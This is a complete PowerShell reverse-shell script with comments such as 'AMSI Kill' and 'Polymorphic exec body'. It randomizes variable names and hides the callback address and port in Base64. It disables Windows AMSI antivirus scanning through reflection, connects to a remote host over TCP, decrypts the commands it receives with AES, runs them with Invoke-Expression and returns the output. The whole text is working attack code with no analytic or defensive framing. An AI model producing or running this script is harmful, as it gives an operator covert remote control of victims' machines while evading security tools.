# Randomized dynamic variables
$vx=("v"+[guid]::NewGuid().ToString("N").Substring(0,6))
$vy=("x"+(65..90+97..122|Get-Random -Count 6|%{[char]$_}) -join "")
$vz=("d"+[guid]::NewGuid().ToString("N").Substring(0,8))

# Encrypted config
$cfg="MTkyLjE2OC4xLjEyMQ=="; # 192.168.1.121 (Base64)
$pp="ODA5MA=="; # 8090 (Base64)

# AES Engine
function $vx([byte[]]$c,[byte[]]$k,[byte[]]$iv){
    $a=[System.Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.IV=$iv
    $d=$a.CreateDecryptor()
    $ms=New-Object IO.MemoryStream(,$c)
    $cs=New-Object Security.Cryptography.CryptoStream($ms,$d,'Read')
    $sr=New-Object IO.StreamReader($cs)
    $sr.ReadToEnd()
}

# AMSI Kill
$ams=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$fld=$ams.GetField('amsiInitFailed','NonPublic,Static')
$fld.SetValue($null,$true)

# Polymorphic exec body
$ip=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cfg))
$pr=[int][Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pp))
$k=[Convert]::FromBase64String("Lk3PbO8Z5nBlzYvQ4U0wGg==")
$iv=(1..16)|%{0}

$cl=New-Object Net.Sockets.TcpClient($ip,$pr)
$st=$cl.GetStream();$bf=New-Object Byte[] 4096

while(($i=$st.Read($bf,0,$bf.Length))-ne 0){
    $cmd=& $vx $bf[0..($i-1)] $k $iv
    $res=Invoke-Expression $cmd|Out-String
    $res+="PS "+(Get-Location).Path+"> "
    $out=[Text.Encoding]::UTF8.GetBytes($res)
    $st.Write($out,0,$out.Length);$st.Flush()
}

$cl.Close()
